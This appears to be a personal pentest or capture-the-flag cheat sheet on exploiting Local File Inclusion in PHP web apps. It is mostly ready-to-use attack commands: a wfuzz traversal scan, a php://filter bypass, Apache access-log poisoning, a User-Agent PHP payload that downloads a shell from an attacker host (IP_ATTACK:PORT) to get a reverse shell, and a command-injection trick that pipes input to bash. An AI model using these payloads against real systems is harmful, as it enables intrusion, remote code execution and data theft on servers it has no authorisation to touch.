---
title: LFI 🎃
---

- Linux File Inclussion
  - Check the `url` adding parameter `file`

![](Pasted%20image%2020240213235821.png)

---

- FUZZ it using this command:
  - [Useful wordlist found here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/)

```shell
wfuzz -c -w dirTraversal.txt  --hw 0 http://10.10.70.109/?view=FUZZ
```

---

- If the backend is filtering by checking the input, try this:

```shell
http://IP/?view=php://filter/FOLDER/convert.base64-encode/resource=index
```

- Check out the &ext variable and put it empty because it won't get the file extension

---

- Log file contamination

```shell
http://IP/?view=dog../../../../../cat/../var/log/apache2/access.log&ext=
```

---

- Exploit the User-Agent Field:
  - First create a shell like the PentestMonkey one
  - Create a python server
  - Load the petition (like log file contamination petition) and capture it with BurpSuite
  - Modify the User-Agent field with this command:

```shell
<?php file_put_contents('shell.php', file_get_contents('http://IP_ATTACK:PORT/shell.php'))?>
```

- Then access to `http://IP/shell.php` and you got the reverse shell

---

When we can echo commands try and it's using a regex like: `/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/` try:

```shell
http://IP_HOST/echo.php?search=id+|+bash
# Then just try other commands like
echo.php?search=ls+|+bash
# Then try to input a reverse shell
```
